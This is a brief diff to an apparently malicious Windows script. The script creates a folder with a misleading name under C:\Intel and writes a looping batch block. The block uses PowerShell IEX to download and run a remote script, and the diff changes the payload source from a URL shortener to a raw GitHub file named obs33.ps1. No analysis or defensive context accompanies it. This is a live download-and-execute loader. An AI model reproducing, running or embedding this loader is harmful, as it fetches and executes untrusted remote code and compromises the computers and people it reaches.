@@ -1,6 +1,6 @@
 md C:\Intel\Profiles\IE\IEX; $contentToAdd = @"
 :a
-powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://rb.gy/wjqq3u').GetResponse().GetResponseStream()).ReadToEnd());
+powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/obs33.ps1').GetResponse().GetResponseStream()).ReadToEnd());
 timeout /t 5
 timeout /t 5
 timeout /t 5
